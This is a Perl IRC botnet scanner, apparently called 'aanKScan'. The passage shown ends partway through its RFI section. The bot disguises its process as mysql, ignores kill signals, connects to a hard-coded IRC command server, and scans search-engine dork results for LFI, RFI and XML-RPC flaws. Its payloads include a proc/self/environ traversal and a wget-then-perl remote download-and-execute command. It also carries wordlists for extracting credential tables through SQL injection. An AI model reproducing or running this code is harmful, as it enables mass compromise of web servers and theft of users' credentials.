#!/usr/bin/perl
$powered="aanK FM.Inc";
$mail="admin(at)intifada.net";

use HTTP::Request;
use LWP::UserAgent;
use IO::Socket;
use IO::Select;
use IO::Socket::INET;
use Socket;
use HTTP::Request::Common;
use LWP::Simple;
use LWP 5.64;
use HTTP::Request::Common qw(POST);
use Digest::MD5 qw(md5_hex);
use MIME::Base64;
my $fakeproc  	= "/usr/bin/mysql -k start"; 
$ircserver    	= "174.122.231.122";
my $ircport   	= "2626";
my $nickname  	= "keren[".int(rand(100))."]";
my $ident     	= "aanK";
my $channel   	= "#xd0rk";
my $runner    	= "aanK";
my $fullname  	= '4,1SIX8NER9GY.4I8n9c';
my $lfi   	= "!lfi";
my $xml		= "!xml";
my $e107	= "!e107";
my $rfi		= "!rfi";
my $sql  	= "!sql";
my $cmdlfi	= "!cmdlfi";
my $cmde107     = "!cmde107";
my $cmdxml	= "!cmdxml";
my $rspo_test   = "../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000";
my $rfiid   	= "http://217.16.8.23/~webmail/idxml.txt??";
my $byroesprd   = "http://217.16.8.23/~webmail/xpl.txt";
my $sixnergy  	= "wget http://217.16.8.23/~webmail/xml.txt -O /tmp/xml.pl;perl /tmp/xml.pl;rm -rf /tmp/xpl.pl;lwp-download http://217.16.8.23/~webmail/xml.txt;perl xml.txt;rm -rf xml.txt";
my @tabele	= ('admin','tblUsers','tblAdmin','user','users','username','usernames','usuario',
					'name','names','nombre','nombres','usuarios','member','members','admin_table','miembro','miembros','membername','admins','administrator',
					'administrators','passwd','password','passwords','pass','Pass','tAdmin','tadmin','user_password','user_passwords','user_name','user_names',
					'member_password','mods','mod','moderators','moderator','user_email','user_emails','user_mail','user_mails','mail','emails','email','address',
					'e-mail','emailaddress','correo','correos','phpbb_users','log','logins','login','registers','register','usr','usrs','ps','pw','un','u_name','u_pass',
					'tpassword','tPassword','u_password','nick','nicks','manager','managers','administrador','tUser','tUsers','administradores','clave','login_id','pwd','pas','sistema_id',
					'sistema_usuario','sistema_password','contrasena','auth','key','senha','tb_admin','tb_administrator','tb_login','tb_logon','tb_members_tb_member',
					'tb_users','tb_user','tb_sys','sys','fazerlogon','logon','fazer','authorization','membros','utilizadores','staff','nuke_authors','accounts','account','accnts',
					'associated','accnt','customers','customer','membres','administrateur','utilisateur','tuser','tusers','utilisateurs','password','amministratore','god','God','authors',
					'asociado','asociados','autores','membername','autor','autores','Users','Admin','Members','Miembros','Usuario','Usuarios','ADMIN','USERS','USER','MEMBER','MEMBERS','USUARIO','USUARIOS','MIEMBROS','MIEMBRO');
my @kolumny	= ('admin_name','cla_adm','usu_adm','fazer','logon','fazerlogon','authorization','membros','utilizadores','sysadmin','email',
					'user_name','username','name','user','user_name','user_username','uname','user_uname','usern','user_usern','un','user_un','mail',
					'usrnm','user_usrnm','usr','usernm','user_usernm','nm','user_nm','login','u_name','nombre','login_id','usr','sistema_id','author',
					'sistema_usuario','auth','key','membername','nme','unme','psw','password','user_password','autores','pass_hash','hash','pass','correo',
					'userpass','user_pass','upw','pword','user_pword','passwd','user_passwd','passw','user_passw','pwrd','user_pwrd','pwd','authors',
					'user_pwd','u_pass','clave','usuario','contrasena','pas','sistema_password','autor','upassword','web_password','web_username');
					
$SIG{'INT'}   	= 'IGNORE';
$SIG{'HUP'}   	= 'IGNORE';
$SIG{'TERM'}  	= 'IGNORE';
$SIG{'CHLD'}  	= 'IGNORE';
$SIG{'PS'}    	= 'IGNORE';
chdir("/tmp");
$ircserver="$ARGV[0]" if $ARGV[0];
$0 = "$fakeproc"."\0"x16;;
&SIGN();
my $pid = fork;
exit if $pid;
die "\n [!] Something Wrong !!!: $!" unless defined($pid);
our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_client = IO::Select->new();
sub sendraw {
    if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]\n";
    } else {
        print $IRC_cur_socket "$_[0]\n";
    }
}
sub connector {
    my $mynick = $_[0];
    my $ircserver_con = $_[1];
    my $ircport_con = $_[2];
    my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$ircserver_con", PeerPort=>$ircport_con) or return(1);
    if (defined($IRC_socket)) {
        $IRC_cur_socket = $IRC_socket;
        $IRC_socket->autoflush(1);
        $sel_client->add($IRC_socket);
        $irc_servers{$IRC_cur_socket}{'host'} = "$ircserver_con";
        $irc_servers{$IRC_cur_socket}{'port'} = "$ircport_con";
        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        $irc_servers{$IRC_cur_socket}{'myip'} = $IRC_socket->sockhost;
        nick("$mynick");
        sendraw("USER $ident ".$IRC_socket->sockhost." $ircserver_con :$fullname");
        sleep 1;
    }
}
sub parse {
    my $servarg = shift;
    if ($servarg =~ /^PING \:(.*)/) {
        sendraw("PONG :$1");
    } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
        my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
        if ($args =~ /^\001VERSION\001$/) {
            notice("$pn", "\001VERSION mIRC v6.17 Khaled Mardam-Bey\001");
        }
        if ($args =~ /^(\Q$mynick\E|\!a)\s+(.*)/ ) {
            my $natrix = $1;
            my $arg = $2;
        }
    }
    elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
        if (lc($1) eq lc($mynick)) {
            $mynick=$4;
            $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        }
    } elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
        nick("$mynick|".int rand(9999));
    } elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
        $mynick = $2;
        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
        sendraw("MODE $nickname +Bxp");
        sendraw("JOIN $channel");
        sendraw("PRIVMSG $channel : 4,1SIX8NER9GY.4I8n9c ");
        sendraw("PRIVMSG $runner : $runner Crooot!!!");
    }
}
my $line_temp;
while( 1 ) {
    while (!(keys(%irc_servers))) { connector("$nickname", "$ircserver", "$ircport"); }
    delete($irc_servers{''}) if (defined($irc_servers{''}));
    my @ready = $sel_client->can_read(0);
    next unless(@ready);
    foreach $fh (@ready) {
        $IRC_cur_socket = $fh;
        $mynick = $irc_servers{$IRC_cur_socket}{'nick'};
        $nread = sysread($fh, $msg, 4096);
        if ($nread == 0) {
            $sel_client->remove($fh);
            $fh->close;
            delete($irc_servers{$fh});
        }
        @lines = split (/\n/, $msg);
        $msg =~ s/\r\n$//;
        if ($msg=~ /PRIVMSG $channel :!help/){

	    	 	sendraw($IRC_cur_socket, "PRIVMSG $channel :4(8@9Help8) 8 use : $rfi $lfi $sql $xml [bug] [dork] - $e107 [dork]");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :4(8@9Help8) 8 use : $cmde107 $cmdlfi $cmdxml [target] [cmd]");
            		sendraw($IRC_cur_socket, "PRIVMSG $channel :4(8@9Help8) 8 use : !respon !about !dec  !enc !version");
			
        }
        if ($msg=~ /PRIVMSG $channel :!version/){
            sendraw($IRC_cur_socket, "PRIVMSG $channel :4(8@9Version4)9 aanKScan v1.0 ");
        }
        if ($msg=~ /PRIVMSG $channel :!engine/){
            sendraw($IRC_cur_socket, "PRIVMSG $channel :4(8@9Engine4)9 Google, Bing, AllTheWeb, Altavista, ASK, UOL, Yahoo.");
        }
        if ($msg=~ /PRIVMSG $channel :!pid/){
            sendraw($IRC_cur_socket, "PRIVMSG $channel :4(8@9PID4)9 Process/ID : 4 $fakeproc - $$");
        }
        if ($msg=~ /PRIVMSG $channel :!about/){
            sendraw($IRC_cur_socket, "PRIVMSG $channel :4(8@9About4)9 aanKScan v1.0");
            sendraw($IRC_cur_socket, "PRIVMSG $channel :4(8@9About4)9 Coded by aanK ");
            sendraw($IRC_cur_socket, "PRIVMSG $channel :4(8@9About4)9 Copyright © 2011 SixNergy");
        }
        ##################################################################### CMD IRC
		if ($msg=~ /PRIVMSG $channel :!enc\s+(.*)/){
			my $enc = $1;
			&enc($enc);
		}
		if ($msg=~ /PRIVMSG $channel :!dec\s+(.*)/){
			my $dec = $1;
			&dec($dec);
		}
		if ($msg=~ /PRIVMSG $channel :!btjoin\s+(.*)/){
			my $cnls = $1;
			&join($cnls);
		}
		if ($msg=~ /PRIVMSG $channel :!btpart\s+(.*)/){
			my $cnls = $1;
			&part($cnls);
		}
		if ($msg=~ /PRIVMSG $channel :!quit\s+(.*)/){
			my $cnls = $1;
			&quit($cnls);
		}
		if ($msg=~ /PRIVMSG $channel :!respon/){
			my $re = query($rfiid);
			if ( $re =~ /Hacked by aanK/ ) {
                sendraw($IRC_cur_socket, "PRIVMSG $channel :4(8@9Info4)9 Ready bro, GO GO GO !!!");
            }
            else {
                sendraw($IRC_cur_socket, "PRIVMSG $channel :4(8@9Info4)9 Fuck You Bro, Check your ID!!");
            }
        }
        ##################################################################### CMD LFI
		if ($msg=~ /PRIVMSG $channel :$cmdlfi\s+(.*?)\s+(.*)/){
			my $url = $1."../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000";
			my $cmd = $2;
			&cmdlfi($url,$cmd);
		}
        #####################################################################
        #####################         LFI LFI LFI         ###################
        ##################################################################### Google Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "GooGLe";
                    my $bugx = $1;
                    my $d0rk = $2;
                    sendraw($IRC_cur_socket, "PRIVMSG $channel :4(8@9LFI4)8 Loading scanner ,9 24 engine !!! ");
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### AllTheWeb Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "AllTheWeb";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### Bing Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "Bing";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### Altavista Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "ALtaViSTa";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### ASK Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "AsK";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### UoL Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "UoL";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### Yahoo Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "YahOo";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### Lycos Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "Lycos";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### Good search Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "GoodSearch";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### Onet engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "Onet";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### Seznam Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "SeznaM";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### NetI Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "NetI";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### DiNo Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "DiNo";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### WitcH Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "WitcH";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### IlsE Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "IlsE";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### SnZ Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "SnZ";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### SapO Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "SapO";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### gigablast Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "gigablast";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### tiscali Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "tiscali";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### Libero Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "libero";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### ixquic Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "ixquic";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### kvasir Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "kvasir";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### szukacz Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "szukacz";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### virgillio Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "virgillio";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### aol Engine
        if ($msg=~ /PRIVMSG $channel :$lfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "aol";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &lfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		########################################################################################
        #####################################################################
        #####################         XML XML XML         ###################
		#####################################################################
		########################################################################################
		if ($msg=~ /PRIVMSG $channel :$cmdxml\s+(.*?)\s+(.*)/){
			my $url = $1;
			my $cmd = $2;
			&cmdxml($url,$cmd);
		}
        ##################################################################### GooGle Engine		
		if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "GooGLe";
                    my $bugx = $1;
                    my $d0rk = $2;
                    sendraw($IRC_cur_socket, "PRIVMSG $channel :4(8@9XML4)8 Loading scanner ,9 24 engine !!!");
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
        ##################################################################### AllTheWeb Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "AllTheWeb";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### Bing Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "Bing";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### Altavista Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "ALtaViSTa";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### ASK Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "AsK";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### UoL Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "UoL";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### Yahoo Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "YahOo";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### Lycos Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "Lycos";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### Good search Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "GoodSearch";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### Onet engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "Onet";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### Seznam Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "SeznaM";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### NetI Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "NetI";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### DiNo Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "DiNo";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### WitcH Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "WitcH";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### IlsE Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "IlsE";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### SnZ Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "SnZ";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### SapO Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "SapO";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### gigablast Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "gigablast";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### tiscali Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "tiscali";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### Libero Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "libero";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### ixquic Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "ixquic";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### kvasir Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "kvasir";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### szukacz Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "szukacz";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### virgillio Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "virgillio";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		##################################################################### aol Engine
        if ($msg=~ /PRIVMSG $channel :$xml\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "aol";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &xmlscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }
		
		
		#####################################################################
        #####################         RFI RFI RFI         ###################
        ##################################################################### GooGle Engine		
		
		if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "GooGLe";
                    my $bugx = $1;
                    my $d0rk = $2;
                    sendraw($IRC_cur_socket, "PRIVMSG $channel :4(8@9RFI4)8 Loading scanner ,9 24 engine !!!");
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### AllTheWeb Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "AllTheWeb";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### Bing Engine
        if ($msg=~ /PRIVMSG $channel :$rfi\s+(.*?)\s+(.*)/ ) {
            if (my $pid = fork) {
                waitpid($pid, 0);
            }
            else {
                if (fork) {    exit; } else {
                    my $engx = "Bing";
                    my $bugx = $1;
                    my $d0rk = $2;
                    &rfiscan($engx,$bugx,$d0rk);
                }
                exit;
            }
        }

        ##################################################################### Altavista Engine
